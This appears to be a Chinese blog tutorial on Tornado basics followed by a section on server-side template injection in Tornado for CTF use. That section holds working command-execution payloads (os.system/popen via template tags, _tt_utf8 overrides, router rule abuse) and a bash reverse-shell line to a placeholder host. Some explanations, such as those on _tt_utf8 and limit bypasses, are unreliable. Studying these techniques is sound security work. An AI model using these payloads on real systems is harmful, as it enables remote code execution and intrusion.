SSTI之Tornado
============

前言
--

前段时间把，jinja2，mako，以及python沙箱逃逸，总的来说吧，有些东西还是融汇贯通的，对于SSTI，我们就模板更上一层的分析，就是python的SSTI，我想学习完了Tornado，会对python模板的ssti有一个更深层的理解。老套路：先学基础，在跟思路，自己理解，最后实战。

对于CTF来说，Tornado算是少见的了，大部分还是flask加上各种花哨的过滤。

第一步
---

当然是先学习官方文档了

[Tornado Web Server — Tornado 4.3 文档 (tornado-zh.readthedocs.io)](https://tornado-zh.readthedocs.io/zh/latest/)

快速入门

Tornado基础
---------

为了更快的弄清Tornado，以下是我对Tornado使用的总结和概括。

### 介绍

```php
Tornado 是一个Python web框架和异步网络库 起初由 FriendFeed 开发. 通过使用非阻塞网络I/O, Tornado 可以支持上万级的连接，处理 长连接, WebSockets, 和其他 需要与每个用户保持长久连接的应用.
```

Tornado 大致提供了三种不同的组件：

- Web 框架
- HTTP 服务端以及客户端
- 异步的网络框架，可以用来实现其他网络协议

前两条都是很好理解的，但是这个异步网络框架是什么，

首先介绍**同步**

基于线程的服务器，像Apache这种的，为了传入的连接，维护了一个操作系统的线程池，Apache会为每个HTTP连接分配一个线程，在已有线程都占用的情况下，Apache会他挑选有的线程虽然处于占用状态但是还有空闲内存，就会在这个线程分出一个新的线程。

好了我们深入刨析一下，服务器接受了用户的数据，还要整理并且输出数据，在这两个过程中间，还夹杂着一个访问远程网络/数据库的操作（I/O）这个过程并不需要占用cpu，这样一来，在单个线程中的就会因为中间的这一过程，让cpu限制好长时间，极大的降低效率

| 接受数据（1ms） | I/O （50ms） |  |  | 整理处理数据 （1ms） |
|---|---|---|---|---|
| 接受数据（1ms） | I/O （50ms） |  |  | 整理处理数据 （1ms） |
| 接受数据（1ms） | I/O （50ms） |  |  | 整理处理数据 （1ms） |
| 接受数据（1ms） | I/O （50ms） |  |  | 整理处理数据 （1ms） |
| 接受数据（1ms） | I/O （50ms） |  |  | 整理处理数据 （1ms） |

（中间部分cpu至闲）

那么**异步**捏

就像吃饭看电影一样，也就是先吃饭后看电影还是边吃饭变看电影的问题

表格示意

| 接受数据（1ms） | I/O （50ms） |  | 整理处理数据 （1ms） |  |  |
|---|---|---|---|---|---|
|  | 接受数据（1ms） |  | I/O （50ms） |  | 整理处理数据 （1ms） |
|  |  |  | 接受数据（1ms） |  | I/O （50ms） |
|  |  |  |  |  |  |

当然，我们的着重还是在web框架上

### 框架基础

写这一小结的目的就是快速入门`tornado`

### 第一个Tornado应用

实例说明，下面就是简单的hello world程序

```py
import tornado.ioloop
import tornado.web

class MainHandler(tornado.web.RequestHandler):#继承web.RequestHandler模块，可以得到请求方式方法
    def get(self):
        self.write("Hello, world")，#提交get请求

if __name__ == "__main__":
    application = tornado.web.Application([  #设置路由
        (r"/", MainHandler),
    ])
    application.listen(8888) #监听端口
    tornado.ioloop.IOLoop.current().start() #使用epoll,io多路复用
```

接下来，我们深度剖析一下

### Application

```php
import tornado.web
app = tornado.web.Application([], debug=True)
```

这里我们第一个参数就是我们要写的路由，另一个参数就是**debug**，**debug**在学习flask的时候也学到过，设置设置 tornado 是否工作在调试模式，默认为 False 即工作在生产模式。当设置 debug=True 后，tornado 会工作在调试 / 开发模式，在此种模式下，tornado 为方便我们开发而提供了几种特性：

- **自动重启**，tornado 应用会监控我们的源代码文件，当有改动保存后便会重启程序，这可以减少我们手动重启程序的次数。需要注意的是，一旦我们保存的更改有错误，自动重启会导致程序报错而退出，从而需要我们保存修正错误后手动启动程序。这一特性也可单独通过 autoreload=True 设置；
- **取消缓存编译的模板**，可以单独通过 compiled\_template\_cache=False 来设置；
- **取消缓存静态文件 hash 值**，可以单独通过 static\_hash\_cache=False 来设置；
- **提供追踪信息**，当 RequestHandler 或者其子类抛出一个异常而未被捕获后，会生成一个包含追踪信息的页面，可以单独通过 serve\_traceback=True 来设置。

#### 路径映射

那hello world的例子来说，

```php
[(r"/", MainHandler),]#这是映射列表
(r"/", MainHandler)
```

路劲映射明显是一个二元的元组

对于这个映射列表中，还可以传递很多信息，如下

```py
url_map = [
    ("/user/(\w+)/?", UserHandler),
    ("/product/(\w+)/(\d+)/?", ProductHandler),
    ("/calc/div/(?P<one>\d+)/(?P<two>\d+)/?", DivHandler),
    web.URLSpec("/index/?", IndexHandler, name="index"),
    web.URLSpec("/error/(?P\d+)/?", ErrorHandler, name="error_page")
if __name__ == '__main__':
    app = web.Application(url_map, debug=True)
    app.listen(8888)
    print('started...')
    ioloop.IOLoop.current().start()
```

- `/?`表示0或1个`/`,即url最后可以有`/`也可以没有`/`
- url定义，可以使用tuple简单实现，也可以使用`web.URLSpec`来创建对象，可以指定一些参数(url,handler,kwargs,name)
- `(?P<xxx>\d+)`,表示取一个组名，这个组名必须是唯一的，不重复的，没有特殊符号,然后跟参数里名称要一样
- `redirect`重定向,`reverse_url`根据名称类获取url

### 动态传参

```php
动态传参：将一些配置参数通过命令行、配置文件方式动态传给程序，而不是代码写死。增加灵活性。
动态传参主要使用的tornado.options某块
```

使用步骤

- 先定义哪些参数`options.define()`
- 从命令行或文件获取参数值`options.parse_command_line()`,`options.parse_config_file("/server.conf")`
- 使用参数`options.xxx`

```php
Tornado.options.define()  # define()中参数解析如下:
# name即要定义的变量名. 注意该变量必须唯一, 否则报错;
# default 用来给name设置默认值;
# type设置变量的类型, 会自动转换接受到的内容, 转换失败报错; 不设置type时根据default值类型转换
  如default没有设置,那么不进行转换.
# multiple 设置选项变量是否可以为多个值, 默认为False; 如需接受一个列表, 则设置该参数为True
# help定义变量的提示信息.
```

第一中方式，命令方式

```php
options.define(name=‘port’, default=8000, type=int, multiple=True)
。。。
app.listen(options.options.port)
```

第二种方式，文件方式

```php
options.parse_config_file('config.ini')
    app.listen(options.options.port)

#config.ini的内容
port = 8888
```

### 接口与调用顺序（RequestHandler的常用方法）

#### initialize()

initialize()函数目的是用来初始化参数（对象属性），很少使用。

```py
class ProfileHandler(RequestHandler):
    def initialize(self, database):
        self.database = database
```

#### prepare()

预处理，即在执行对应请求方式的 HTTP 方法（如 get、post 等）前先执行，注意：不论以何种 HTTP 方式请求，都会执行 prepare () 方法。

以预处理请求体中的 json 数据为例：

```php
class IndexHandler(RequestHandler):
    def prepare(self):
        if self.request.headers.get("Content-Type").startswith("application/json"):
            self.json_dict = json.loads(self.request.body)
        else:
            self.json_dict = None

def post(self):
    if self.json_dict:
        for key, value in self.json_dict.items():
            self.write("<h3>%s</h3><p>%s</p>" % (key, value))

def put(self):
    if self.json_dict:
        for key, value in self.json_dict.items():
            self.write("<h3>%s</h3><p>%s</p>" % (key, value))
```

用于真正调用请求处理之前的初始化方法

#### HTTP 请求方法

| 方法 | 描述 |
|---|---|
| get | 请求指定的页面信息，并返回实体主体。 |
| head | 类似于 get 请求，只不过返回的响应中没有具体的内容，用于获取报头 |
| post | 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和 / 或已有资源的修改。 |
| delete | 请求服务器删除指定的内容。 |
| patch | 请求修改局部数据。 |
| put | 从客户端向服务器传送的数据取代指定的文档的内容。 |
| options | 返回给定 URL 支持的所有 HTTP 方法。 |

#### on\_finish

清理释放或处理日志，关闭句柄

### 获得参数输入内容

#### 获得查询字符串参数

```py
class UrlParamHandler(web.RequestHandler):
    async def get(self):
        name = self.get_query_argument("name")
        age = self.get_query_argument("age")
        self.write("name: {}, age: {}".format(name, age))

        self.write('<br/>')
        names = self.get_query_arguments("name")
        ages = self.get_query_arguments("age")
        self.write("names: {}, ages: {}".format(names, ages))
```

**get\_query\_argument(name, default=\_ARG\_DEFAULT, strip=True)：**

```php
从请求的查询字符串中返回指定参数 name 的值，如果出现多个同名参数，则返回最后一个的值
```

**get\_query\_arguments(name, strip=True)**

```php
从请求的查询字符串中返回指定参数 name 的值，注意返回的是 list 列表（即使对应 name 参数只有一个值）。若未找到 name 参数，则返回空列表 []。
```

!\[image-20230319114025268\](C:\\Users\\kangye li\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230319114025268.png)

#### 获取请求体参数

self.get\_body\_argument(‘keyword’, ‘’)  
获取post请求方式的keyword对应的值,如果不存在，则为空字符串  
self.get\_body\_arguments(‘keyword’)  
返回一个列表，获取post请求方式的keyword对应的一组值，如果不存在，则为空列表

即上面的get\_query\_argument的post方式

```py
class JsonWithFormHeadersParamHandler(web.RequestHandler):
    async def post(self):
        name = self.get_body_argument("name")
        age = self.get_body_argument("age")
        self.write("name: {}, age: {}".format(name, age))
```

#### 两者结合

```py
    async def get(self):
        name = self.get_argument("name")
        age = self.get_argument("age")
        self.write("name: {}, age: {}".format(name, age))

        self.write('<br/>')
        names = self.get_arguments("name")
        ages = self.get_arguments("age")
        self.write("names: {}, ages: {}".format(names, ages))

    async def post(self):
        name = self.get_argument("name")
        age = self.get_argument("age")
        self.write("name: {}, age: {}".format(name, age))

        self.write('<br/>')
        names = self.get_arguments("name")
        ages = self.get_arguments("age")
        self.write("names: {}, ages: {}".format(names, ages))

```

### 输出内容方式

```php
set_status: 设置状态码
write: 写数据,可以write多次,放缓存中,而不会中断当flush或者finish或者没消息断开时发送
flush: 刷新数据到客户端
finish: 写数据,写完断开了
```

### 模板

#### 模板语法

```py
import tornado.template as template

payload = "{{1+1}}"
print(template.Template(payload).generate())
```

这就是最简单的一个实验脚本了。当然也可以通过 `template.Loader` 加载本地的模板文件；以及可以在 `generate` 中指定任意参数，从而可以在模板字符串中接受它。这些与 jinja2 都非常类似。

1，**`{{ ... }}`：里面直接写 python 语句即可，没有经过特殊的转换。默认输出会经过 html 编码**

2，**`{% ... %}`：内置的特殊语法，有以下几种规则**

- `{# ... #}`：注释
- `{% apply *function* %}...{% end %}`：用于执行函数，`function` 是函数名。`apply` 到 `end` 之间的内容是函数的参数
- `{% autoescape *function* %}`：用于设置当前模板文件的编码方式。
- `{% block *name* %}...{% end %}`：引用定义过的模板段，通常来说会配合 `extends` 使用。感觉 `block` 同时承担了定义和引用的作用，这个行为不太好理解，比较奇怪。比如 `{% block name %}a{% end %}{% block name %}b{% end %}` 的结果是 `bb`...
- `{% comment ... %}`：也是注释
- `{% extends *filename* %}`：将模板文件引入当前的模板，配合 `block` 食用。使用 `extends` 的模板是比较特殊的，需要有 template loader，以及如果要起到继承的作用，需要先在加载被引用的模板文件，然后再加载引用的模板文件
- `{% for *var* in *expr* %}...{% end %}`：等价与 python 的 for 循环，可以使用 `{% break %}` 和 `{% continue %}`
- `{% from *x* import *y* %}`：等价与 python 原始的 `import`
- `{% if *condition* %}...{% elif *condition* %}...{% else %}...{% end %}`：等价与 python 的 `if`
- `{% import *module* %}`：等价与 python 原始的 `import`
- `{% include *filename* %}`：与手动合并模板文件到 `include` 位置的效果一样（`autoescape` 是唯一不生效的例外）
- `{% module *expr* %}`：模块化模板引用，通常用于 UI 模块。
- `{% raw *expr* %}`：就是常规的模板语句，只是输出不会被转义
- `{% set *x* = *y* %}`：创建一个局部变量
- `{% try %}...{% except %}...{% else %}...{% finally %}...{% end %}`：等同于 python 的异常捕获相关语句
- `{% while *condition* %}... {% end %}`：等价与 python 的 while 循环，可以使用 `{% break %}` 和 `{% continue %}`
- `{% whitespace *mode* %}`：设定模板对于空白符号的处理机制，有三种：`all` - 不做修改、`single` - 多个空白符号变成一个、`oneline` - 先把所有空白符变成空格，然后连续空格变成一个空格

3,**`apply` 的内置函数列表：**

- `linkify`：把链接转为 html 链接标签（`<a href="...`）
- `squeeze`：作用与 `{% whitespace oneline %}` 一样

4,**`autoescape` 的内置函数列表：**

- `xhtml_escape`：html 编码
- `json_encode`：转为 json
- `url_escape`：url 编码

5，**其他函数（在 settings 中指定）**

- `xhtml_unescape`：html 解码
- `url_unescape`：url 解码
- `json_decode`：解开 json
- `utf8`：utf8 编码
- `to_unicode`：utf8 解码
- `native_str`：utf8 解码
- `to_basestring`：历史遗留功能，现在和 `to_unicode` 是一样的作用
- `recursive_unicode`：把可迭代对象中的所有元素进行 `to_unicode`

#### 模板使用

**路径指定**

在`settings`中指定模板所在目录，如不指定，默认在当前文件夹下：

```python
import tornado.ioloop
import tornado.web

class APIHandler(tornado.web.RequestHandler):
    def get(self):
        # 找当前目录下的views文件夹，到views下去找api.html模板文件
        self.render("111.html")

settings = {
    "debug": True,
    "template_path": "template",  # 指定模板目录
    "static_path": "static",  # 指定静态文件目录
}

application = tornado.web.Application([
    tornado.web.url(r'/111', APIHandler),
], **settings)

if __name__ == '__main__':
    application.listen(8000)
    tornado.ioloop.IOLoop.instance().start()
```

**模板传参**

`tornado`中的模板传参与`Flask`相同。

模板传参可以通过`k=v`的方式传递，也可以通过`**dict`的方式进行解包传递：

```py
class APIHandler(tornado.web.RequestHandler):
    def get(self):
        context = {
            "name": "只因",
            "age": 2.5,
            "hobby": ["篮球", "唱","跳","rap"]
        }
        self.render("ikun.html",**context)
        # self.render("ikun.html",name="只因",age=2.5,hobby=["篮球", "唱","跳","rap"])
```

我们打开ikun.html，内容如下

```css
<body>
    <p>{{name}}</p>
    <p>{{age}}</p>
    <p>{{hobby[0]}}-{{hobby[1]}}-{{hobby[3]}}-{{hobby[4]}}</p>
</body>
```

**模板渲染**

**使用 render () 方法来渲染模板并返回给客户端**。

```python
class IndexHandler(RequestHandler):
    def get(self):
        self.render("index.html") # 渲染主页模板，并返回给客户端。

current_path = os.path.dirname(__file__)
app = tornado.web.Application(
    [
        (r'/1/', IndexHandler),
        (r'/2/', StaticFileHandler, {"path":os.path.join(current_path, "statics/html")}),
    ],
    static_path=os.path.join(current_path, "statics"),
    template_path=os.path.join(os.path.dirname(__file__), "templates"),
```

Tornado的SSTI
------------

### 常规手法（通用）

我们在前面也提到过，我们称python的web框架的ssti都是由通用属性的，我们可以结合这jiajn2，mako 以及python的沙箱逃逸，进行payload。就像

```php
{{ __import__("os").system("whoami") }}
{% raw __import__("os").system("whoami") %}
。。。。。。
```

等等，加上一些bypass

### 特殊手法

#### 利用`tornado.template`的特性

tornado中的template方法在读取模板后会将模板转化成py代码的形式，然后再通过再通过后面的genergte()把前面的模板py代码执行，也就是完成模板渲染的最后一步，写到这里我们也大概明白了整个渲染的过程

```php
模板--->模板的py代码形式---->通过genergte()执行模板的py代码--->完成渲染返回到用户界面
```

在这里我们主要利用的**模板的py代码形式----&gt;通过genergte()执行模板的py代码**这个过程。

首先我们先来查看一下这个临时代码具体是什么样子的

```php
from tornado.template import Template
Template('{{print(__loader__.get_source(1))}}').generate()
>>>>
def _tt_execute():  # <string>:0
    _tt_buffer = []  # <string>:0
    _tt_append = _tt_buffer.append  # <string>:0
    _tt_tmp = print(__loader__.get_source(1))  # <string>:1
    if isinstance(_tt_tmp, _tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp)  # <string>:1
    else: _tt_tmp = _tt_utf8(str(_tt_tmp))  # <string>:1
    _tt_tmp = _tt_utf8(xhtml_escape(_tt_tmp))  # <string>:1
    _tt_append(_tt_tmp)  # <string>:1
    return _tt_utf8('').join(_tt_buffer)  # <string>:0
```

我们可以试着解释一下这个临时代码

首先这个函数`_tt_execute()`它会接收一些变量和函数，然后返回编译后的模板。这个函数的作用是将模板中的变量和表达式转化为Python代码并执行。

在这个函数中，`_tt_buffer` 是一个空列表，用于存储编译后的模板。`_tt_append` 是一个函数，用于将字符串添加到 `_tt_buffer` 中。`_tt_tmp` 是一个临时变量，用于存储模板中的表达式。

`print(__loader__.get_source(1))` 这一行代码会输出当前模板文件的源代码。然后，如果 `_tt_tmp` 是字符串类型，那么就使用 `_tt_utf8` 将其转化为 UTF-8 编码。接着，使用 `xhtml_escape` 函数将 `_tt_tmp` 转义为 HTML 实体，然后将其添加到 `_tt_buffer` 中。

最后，这个函数会使用 `_tt_utf8('').join(_tt_buffer)` 将 `_tt_buffer` 中的所有字符串连接起来，并返回编译后的模板。

我们可以注意到\_tt\_utf8这个变量名，`_tt_utf8` 是 Tornado 模板引擎中内置的一个变量名，它被用来存储模板渲染时使用的编码方式。具体来说，当模板中使用了非 ASCII 字符时，Tornado 会将模板编码成 UTF-8，并将编码后的内容保存到 `_tt_utf8` 变量中。在渲染模板时，Tornado 会使用 `_tt_utf8` 变量中保存的编码方式将编码后的内容转换成正确的 Unicode 字符串。

再回想一下上面的模板语法：**`{% set *x* = *y* %}`**：创建一个局部变量，那我是不是可以把一些函数替换到`_tt_utf8`中从而然他执行？

payload：

```php
Template('{% set _tt_utf8 = __import__("os").system %}{{"whoami"}}').generate()
>>>
desktop-bt66bud\xxx
```

执行成功，但是还是会报错的因为\_tt\_utf8不能接受int类型的字符串

借助**`{% apply%}。。。{% end %}`的变形**直接注入函数使用:

`{% apply __import__("os").system("id") %}id{% end %}`

`{% apply [__import__("os").system("id"), str][1] %}id{% end %}`：能执行命令且不会报错

还可以使用更加巧妙的方法，我们为什莫不能直接插入一行代码呢？

```php
Template('''{% set _tt_utf8 = str %}{% set xhtml_escape = str\n eval("__import__('os').system('id')") %}''').generate()
```

#### 利用web.Application的特性

```py
import tornado.ioloop
import tornado.web

class IndexHandler(tornado.web.RequestHandler):
    def get(self):
        tornado.web.RequestHandler._template_loaders = {}

        with open('index.html', 'w') as (f):
            f.write(self.get_argument('name'))

        self.render('index.html')

app = tornado.web.Application(
    [('/', IndexHandler)],
)
if __name__ == '__main__':
    app.listen(8080)
    tornado.ioloop.IOLoop.current().start()
```

这是一个简单的模板样例，里面包含着有tornado的ssti，下面我详细的解释一下这段代码的核心部分

```py
class IndexHandler(tornado.web.RequestHandler):
    def get(self):
        tornado.web.RequestHandler._template_loaders = {}
        with open('index.html', 'w') as (f):
            f.write(self.get_argument('name'))
        self.render('index.html')
```

首先是 `tornado.web.RequestHandler._template_loaders = {}`对于 Tornado 来说，`RequestHandler` 是处理 HTTP 请求的核心类之一。它负责解析客户端发送的请求、生成响应并返回给客户端。`_template_loaders` 是 `RequestHandler` 类的一个属性，它用于存储模板加载器的字典。一旦 `self.render` 之后，就会实例化一个 `tornado.template.Loader`，\_template\_loaders就会只存在这一个属性，并且不能再次修改，这个时候再去修改文件内容，它也不会再实例化一次。所以这里需要把 `tornado.web.RequestHandler._template_loaders` 清空。如果不清空的话，会一直用的第一个传入的 payload。

下面的代码就好理解了，就是把get传入的name值写入到index.html，index.html就只有name值

然后self.render('index.html')渲染

这里顺便说一下我的那个疑问，明明这个`open('index.html', 'w')`，我们每次写入都会把之前的内容覆盖，再次渲染，为什么还是显示的第一个传入的 payload，这就是我们上面所讲到的`_template_loaders`这个属性的特性。第一次传入就已经将属性写入`_template_loaders`中，我们没修改这个，所以说，渲染还是要看`_template_loaders`的脸色。

##### 利用 Application

```php
Application.settings：web 服务的配置，可能会泄露一些敏感的配置
Application.wildcard_router.add_rules：新增一个 url 处理逻辑
Application.add_transform：新增一个返回数据的处理逻辑
```

##### 利用 HTTPServerRequest

HTTPServerRequest 是 Tornado 框架中处理 HTTP 请求的对象之一，它包含了许多有用的属性来访问请求的信息。下面是HTTPServerRequest 的属性：

**绕过字符限制**

1. `request.method`: 获取 HTTP 请求的方法，如 GET、POST、PUT、DELETE 等。
2. `request.uri`: 获取完整的请求 URI，包括路径、查询参数和锚点。
3. `request.path`: 获取请求的路径部分，不包括查询参数和锚点。
4. `request.query`: 获取请求的查询参数部分，以字典形式返回。
5. `request.body`: 获取请求的主体内容，通常用于 POST、PUT 请求。
6. `request.headers`: 获取请求的 HTTP 头部，以字典形式返回。
7. `request.remote_ip`: 获取请求的客户端 IP 地址。
8. `request.protocol`: 获取请求使用的协议，如 HTTP、HTTPS 等。
9. `request.version`: 获取请求的 HTTP 版本。
10. `request.cookies`: 获取请求中的所有 Cookie，以字典形式返回。

举个例子，

1，对于 request.path 属性，如果使用 URL 编码来处理路径，那么就可以绕过路径长度的限制。例如，对于以下的路径：

```php
http://example.com/api/foo/bar
```

如果将它编码为：

```php
http://example.com/api/foo%2fbar
```

那么这个路径就会被解析为 `/api/foo/bar`，从而绕过了路径长度的限制。

2，对于 request.body 属性，如果使用分块传输编码（chunked transfer encoding）来传输数据，那么就可以绕过请求主体的大小限制。分块传输编码是一种将请求主体分成多个块进行传输的技术，每个块都有自己的长度前缀，这样就可以避免将整个请求主体一次性发送过来。这种技术可以用于绕过请求主体大小的限制，但需要服务器端和客户端都支持分块传输编码。

3，对于 request.headers 属性，如果使用自定义的 HTTP 头部来传递数据，那么就可以绕过请求头部的大小限制。由于 HTTP 协议允许自定义的头部，因此可以将数据放在自定义的头部中传递。例如，可以将数据放在 X-Data 自定义头部中，然后在服务器端使用 request.headers\['X-Data'\] 来获取数据。

写入http响应

- `request.connection.write`
- `request.connection.stream.write`
- `request.server_connection.stream.write`

例如：

```php
?name={%raw request.connection.write(("HTTP/1.1 200 OK\r\nCMD: "+__import__("os").popen("id").read()).encode()+b"hacked: ")%}'
```

该表达式通过 `__import__("os")` 导入了 Python 的 `os` 模块，然后使用 `os.popen("id").read()` 执行了一个命令，该命令会返回当前用户的 ID。然后，使用字符串拼接的方式，构造了一个 HTTP 响应头部，其中包含了一个 `CMD` 字段，该字段的值为执行命令的结果。最后，将构造好的响应头部字符串通过 `request.connection.write()` 方法写入 HTTP 响应中。

##### 利用 RequestHandler

**回显结果**

```php
RequestHandler.set_cookie：设置 cookie
RequestHandler.set_header：设置一个新的响应头
RequestHandler.redirect：重定向，可以通过 location 获取回显
RequestHandler.send_error：发送错误码和错误信息
RequestHandler.write_error：同上，被 send_error 调用
```

### 一些bypass

这也是老生常谈的话题了，一些过滤技巧完全可以参考jiajn2，mako，以及通用的python的沙箱逃逸技巧，这是还是讲到一些没有见到过的方法和思路，也算是积累以下吧

#### 绕过`.`

tornado中没有过滤器，所以我们能使用|arrt（）来绕过。方法：利用get\_argument()

```php
{{eval(handler.get_argument(request.method))}}
?GET/POST=__import__("os").popen("ls").read()
```

#### tornado函数调用

tornado中是可以直接使用global()函数的，并且可以直接调用一些python的初始方法，比如`__import__`、eval、print、hex等

```php
{{__import__("os").popen("ls").read()}}
```

#### 弹shell（过滤括号及引号）

```php
__import__('os').system('bash -i >& /dev/tcp/xxx/xxx 0>&1')%0a"""%0a&data={%autoescape None%}{% raw request.body%0a    _tt_utf8=exec%}&%0a"""
```

#### 其他

```php
{{handler.application.default_router.add_rules([["123","os.po"+"pen","a","345"]])}}
{{handler.application.default_router.named_rules['345'].target('/readflag').read()}}
```

参考
--

[SecMap - SSTI（Tornado） - Tr0y's Blog](https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/#%E6%80%BB%E7%BB%93)

[(94条消息) tornado模板注入\_tornado 模板注入\_yu22x的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/123329244)

[Tornado Web Server — Tornado 6.2.dev1 文档 (osgeo.cn)](https://www.osgeo.cn/tornado/)

[?Tornado入门这一篇足以 | iworkh blog (gitee.io)](https://iworkh.gitee.io/blog/2020/06/08/python_tornado_info/)